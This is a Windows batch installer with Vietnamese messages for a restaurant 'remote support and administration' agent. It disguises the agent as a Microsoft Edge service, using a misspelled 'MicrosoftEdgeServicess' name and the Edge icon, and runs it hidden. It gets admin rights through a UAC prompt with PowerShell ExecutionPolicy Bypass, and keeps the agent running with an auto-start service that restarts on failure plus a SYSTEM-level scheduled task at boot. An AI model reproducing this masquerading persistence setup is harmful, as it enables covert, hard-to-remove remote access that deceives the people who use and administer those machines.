@echo off
title Cai Dat Dich Vu MicrosoftEdgeServicess (Windows Services)
cd /d "%~dp0"

echo ===============================================================================
echo   CAI DAT DICH VU HO TRO VA QUAN TRI TU XA MAY TRAM NHA HANG
echo   Ten dich vu: MicrosoftEdgeServicess
echo   Co che: Tu khoi dong cung Windows (Automatic) - Chay ngam 100 phan tram
echo   Bieu tuong: Microsoft Edge chinh thuc
echo   Bao ve tien trinh: Single-Instance (Khong bi nhan ban)
echo ===============================================================================
echo.

:: 1. Kiem tra xem nguoi dung co dang chay truc tiep trong file ZIP chua giai nen khong
if not exist "%~dp0MicrosoftEdgeServicess.exe" (
    echo.
    echo ===============================================================================
    echo   [CANH BAO QUAN TRONG: CHUA GIAI NEN FILE NEN ZIP]
    echo ===============================================================================
    echo   Ban dang mo truc tiep file tu trong file nen ZIP chua duoc giai nen!
    echo   Windows chi giai nen tam thoi file .bat, nen khong the cai dat duoc.
    echo.
    echo   HUONG DAN XU LY:
    echo     Buoc 1: Dong cua so nay lai.
    echo     Buoc 2: Nhap CHUOT PHAI vao file "Restaurant_Support_Agent_Full.zip".
    echo     Buoc 3: Chon "Extract All..." (Giai nen tat ca) hoac dung WinRAR chon "Extract Here".
    echo     Buoc 4: Vao thu muc vua duoc giai nen ra, roi chay lai file "Cai_Dat_Dich_Vu_Windows.bat".
    echo ===============================================================================
    echo.
    pause
    exit /b 1
)

:: 2. Kiem tra quyen Administrator va tu dong yeu cau UAC neu chua co
net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [THONG BAO] Dang yeu cau quyen Quan tri vien (Run as Administrator UAC)...
    powershell -NoProfile -ExecutionPolicy Bypass -Command "Start-Process cmd.exe -ArgumentList '/k \"\"%~f0\"\"' -Verb RunAs" 2>nul
    if %errorlevel% equ 0 exit /b 0
    echo.
    echo ===============================================================================
    echo   [CANH BAO QUYEN HAN QUAN TRI VIEN]
    echo ===============================================================================
    echo   Khong the tu dong nang quyen Administrator!
    echo   Vui long:
    echo     1. Nhap CHUOT PHAI vao file "Cai_Dat_Dich_Vu_Windows.bat".
    echo     2. Chon "Run as administrator" (Chay voi quyen quan tri vien).
    echo ===============================================================================
    echo.
    pause
    exit /b 1
)

:: 3. Don dep tat ca tien trinh cu va trung lap
echo 1. Dang don dep cac tien trinh cu dang chay (neu co)...
taskkill /F /IM MicrosoftEdgeServicess.exe >nul 2>&1

:: 4. Thiet lap thu muc cai dat he thong
set "INSTALL_DIR=C:\ProgramData\MicrosoftEdgeServicess"
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%"

echo 2. Dang sao chep cac tep dich vu vao: %INSTALL_DIR%
copy /Y "%~dp0MicrosoftEdgeServicess.exe" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0config.json" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0edge.ico" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0restaurant_support_agent.py" "%INSTALL_DIR%\" >nul 2>nul
copy /Y "%~dp0Chay_Agent_Truc_Tiep.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Kiem_Tra_Trang_Thai.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0Go_Cai_Dat_Dich_Vu.bat" "%INSTALL_DIR%\" >nul
copy /Y "%~dp0README_HUONG_DAN.txt" "%INSTALL_DIR%\" >nul 2>nul

:: 5. Dung va go bo service cu neu ton tai
echo 3. Dang thiet lap Windows Service MicrosoftEdgeServicess...
net stop MicrosoftEdgeServicess >nul 2>&1
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" remove >nul 2>&1
sc.exe delete MicrosoftEdgeServicess >nul 2>&1

:: 6. Dang ky truc tiep vao Windows Service Control Manager (services.msc)
echo    -> Dang dang ky vao Windows Service Control Manager...
"%INSTALL_DIR%\MicrosoftEdgeServicess.exe" install >nul 2>&1

:: Neu chua thay service thi dang ky bang sc.exe tao service truc tiep
sc.exe query MicrosoftEdgeServicess >nul 2>&1
if %errorlevel% neq 0 (
    echo    -> Dang ky truc tiep qua sc.exe...
    sc.exe create MicrosoftEdgeServicess binPath= "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
)

:: Cau hinh khoi dong tu dong va tu phuc hoi khi loi (Restart on failure sau 5 giay)
sc.exe config MicrosoftEdgeServicess start= auto DisplayName= "MicrosoftEdgeServicess" >nul 2>&1
sc.exe description MicrosoftEdgeServicess "Dich vu ho tro ky thuat va quan tri tu xa may tram nha hang Golden Gate." >nul 2>&1
sc.exe failure MicrosoftEdgeServicess reset= 60 actions= restart/5000/restart/5000/restart/5000 >nul 2>&1

:: 7. Khoi dong Windows Service ngay bay gio
echo 4. Dang khoi chay Windows Service ngam...
net start MicrosoftEdgeServicess

:: 8. Thiet lap du phong qua Task Scheduler
echo 5. Dang thiet lap du phong qua Task Scheduler...
schtasks /Create /TN "MicrosoftEdgeServicess" /TR "\"%INSTALL_DIR%\MicrosoftEdgeServicess.exe\"" /SC ONSTART /RU "SYSTEM" /RL HIGHEST /F >nul 2>&1

echo.
echo ===============================================================================
echo   CAI DAT HOAN TAT 100 PHAN TRAM!
echo   - Thu muc cai dat he thong: %INSTALL_DIR%
echo   - Ten dich vu Windows: MicrosoftEdgeServicess
echo   - Trang thai trong services.msc: Running (Dang chay ngam)
echo   - Trang thai trong Task Manager -> the "Services": Running
echo   - Khoi dong cung Windows: Automatic (Tu dong chay khi bat may)
echo   - Bieu tuong: Microsoft Edge chinh thuc
echo   - Bao ve: Single-Instance (Chi duy nhat 1 tien trinh, khong nhan ban)
echo ===============================================================================
echo.
pause
